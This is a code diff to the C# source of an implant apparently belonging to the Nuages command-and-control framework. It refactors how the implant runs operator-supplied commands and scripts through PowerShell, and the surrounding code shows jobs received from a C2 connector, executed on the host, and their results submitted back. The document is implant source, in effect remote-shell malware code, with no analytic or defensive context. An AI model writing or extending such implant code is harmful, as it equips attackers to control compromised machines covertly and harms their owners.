@@ -8,6 +8,7 @@ using System.Net.Sockets;
 using System.Json;
 using NuagesSharpImplant.Connections;
 using System.Threading;
+using NuagesSharpImplant.Utils;
 
 namespace NuagesSharpImplant
 {
@@ -29,6 +30,7 @@ namespace NuagesSharpImplant
         JsonArray jobs;
         private Random rnd;
         private Dictionary<string, Action<JsonObject>> do_job;
+        Posh posh;
 
         string GetLocalIPv4()
         {
@@ -46,6 +48,8 @@ namespace NuagesSharpImplant
 
         public NuagesC2Implant(Dictionary<string, string> config, NuagesC2Connector connector)
         {
+            this.posh = new Posh();
+
             this.jobs = new JsonArray();
 
             this.config = config;
@@ -162,7 +166,7 @@ namespace NuagesSharpImplant
             Directory.SetCurrentDirectory(path);
             if (this.config["shell"].ToLower() == "powershell")
             {
-                result = Utils.Posh.posh.execute(cmd, config.ContainsKey("single_posh_runspace") && config["single_posh_runspace"].ToLower()=="true");
+                result = this.posh.execute(cmd, config.ContainsKey("single_posh_runspace") && config["single_posh_runspace"].ToLower()=="true");
                 hasError = false;
             }
             else
@@ -389,7 +393,7 @@ namespace NuagesSharpImplant
                 script = "";
             }
             script += "\r\n" + command;
-            string result = Utils.Posh.posh(script);
+            string result = this.posh.execute(script, config.ContainsKey("single_posh_runspace") && config["single_posh_runspace"].ToLower() == "true");
             SubmitJobResult(jobId, result, false);
 
         }
